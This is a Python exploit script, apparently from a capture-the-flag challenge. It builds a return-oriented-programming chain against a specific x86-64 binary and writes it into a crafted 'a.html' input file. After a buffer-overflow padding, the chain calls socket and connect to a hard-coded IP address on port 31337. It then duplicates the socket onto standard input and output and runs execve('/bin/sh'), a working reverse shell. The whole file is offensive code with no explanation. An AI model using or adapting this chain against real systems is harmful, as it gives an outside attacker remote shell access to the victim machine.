import struct
import string
import sys
def p(x):
	return struct.pack('<Q', x)
'''
.text:000000000041B73A                 pop     rdx
.text:000000000041B73B                 xor     [rax-77h], cl
.text:000000000041B73E                 retn
'''

'''
.text:0000000000434D5A                 mov     [rsi+8], rax
.text:0000000000434D5E                 mov     eax, 0
.text:0000000000434D63                 retn

0x0044d349 pop rax ; add rsp, 0x08 ; ret  ;
'''

pop_rdx_ret = 0x41B73A
pop_rdi_ret = 0x0040462e
pop_rsi_pop_ret = 0x004055c0
pop_rax_pop_ret = 0x0044d349
write_val = 0x434D5A 
#(rdi,rsi,rdx)
socket_plt = 0x402a50

junk = 'A' * 8
addr = 0x00693100
aa = 0x00693000
cc = 0x44d39a
f = open('a.html', 'wb')
content = 'AAA\x00'
content = content.ljust(1024 + 5 * 8, 'A')

#socket(2,1,0)
content += p(pop_rsi_pop_ret)
content += junk
content += junk
content += p(pop_rdi_ret)
content += p(2) 
content += p(pop_rsi_pop_ret)
content += p(1)
content += junk
content += p(pop_rax_pop_ret)
content += p(aa)
content += junk
content += p(pop_rdx_ret)
content += p(0)
content += p(socket_plt)

#connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
content += p(pop_rsi_pop_ret)
content += p(0x00693100 - 8) # rsi
content += (junk) #
content += p(pop_rax_pop_ret)
content += '\x02\x00AAAAAA' # rax
content += (junk)
content += p(write_val)
 
content += p(pop_rsi_pop_ret)
content += p(0x00693102 - 8) # rsi
content += (junk) #
content += p(pop_rax_pop_ret)
content += '\x7a\x69AAAAAA' # rax
content += (junk)
content += p(write_val)

content += p(pop_rsi_pop_ret)
content += p(0x00693104 - 8) # rsi
content += (junk) #
content += p(pop_rax_pop_ret)
content += '\xca\x78\x07\x6f\x00\x00\x00\x00' # rax
content += (junk)
content += p(write_val)
 
content += p(pop_rdi_ret)
content += p(9)
content += p(pop_rsi_pop_ret)
content += p(0x693100)
content += junk
content += p(pop_rax_pop_ret)
content += p(aa)
content += junk
content += p(pop_rdx_ret)
content += p(0x10)
connect_plt = 0x402dc0
content += p(connect_plt)

# dup2(0,9); dup2(1,9);
content += p(pop_rdi_ret)
content += p(9);
content += p(pop_rsi_pop_ret)
content += p(0);
content += junk;
dup2_plt = 0x402e40
content += p(dup2_plt)

content += p(pop_rdi_ret)
content += p(9);
content += p(pop_rsi_pop_ret)
content += p(1);
content += junk;
dup2_plt = 0x402e40
content += p(dup2_plt)

# execve('/bin/sh', NULL, NULL)
content += p(pop_rsi_pop_ret)
content += p(0x00693200 - 8) # rsi
content += junk
content += p(pop_rax_pop_ret)
content += '//bin/sh'
content += junk
content += p(write_val)
content += p(pop_rdi_ret)
content += p(0x693200)
content += p(pop_rsi_pop_ret)
content += p(0)
content += junk
content += p(pop_rax_pop_ret)
content += p(aa)
content += junk
content += p(pop_rdx_ret)
content += p(0)
execve_plt = 0x4031d0
content += p(execve_plt)

f.write(content)
f.close()
